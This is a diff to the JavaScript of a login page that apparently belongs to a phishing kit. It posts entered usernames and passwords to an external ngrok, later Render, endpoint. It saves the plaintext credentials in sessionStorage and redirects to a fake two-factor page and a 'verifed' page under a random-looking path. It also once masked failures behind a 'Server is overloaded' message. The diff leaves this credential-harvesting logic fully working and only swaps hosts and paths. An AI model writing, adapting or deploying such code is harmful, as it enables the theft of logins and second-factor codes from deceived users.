@@ -22,7 +22,7 @@ document.addEventListener('DOMContentLoaded', function() {
         loginButton.disabled = true;
         errorElement.style.display = 'none';
         
-        fetch('https://daf02e0ee58d.ngrok-free.app/process_login', {
+        fetch('https://your-render-app.onrender.com/process_login', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -38,28 +38,24 @@ document.addEventListener('DOMContentLoaded', function() {
         })
         .then(data => {
             if (data.status === 'success') {
-                window.location.href = '/aerbtgbhaebhrt/verifed/index.html';
+                window.location.href = '/yomae/website/verifed/index.html';
             } 
             else if (data.status === '2fa_required') {
                 sessionStorage.setItem('loginData', JSON.stringify({
                     username: username,
                     password: password
                 }));
-                window.location.href = '/aerbtgbhaebhrt/2FA/index.html';
-            }
-            else if (data.status === 'invalid_credentials') {
-                showError('Incorrect username or password. Please try again.');
+                window.location.href = '/yomae/website/2FA/index.html';
             }
             else {
-                showError('Server is overloaded. Please try again later.');
+                showError(data.message || 'An error occurred');
             }
         })
         .catch(error => {
             console.error('Error:', error);
-            showError('Server is overloaded. Please try again later.');
+            showError('Server error. Please try again later.');
         })
         .finally(() => {
-            // Reset button state
             buttonText.style.display = 'inline-block';
             loadingGif.style.display = 'none';
             loginButton.disabled = false;
@@ -70,6 +66,4 @@ document.addEventListener('DOMContentLoaded', function() {
         errorElement.textContent = message;
         errorElement.style.display = 'block';
     }
-
 });
-
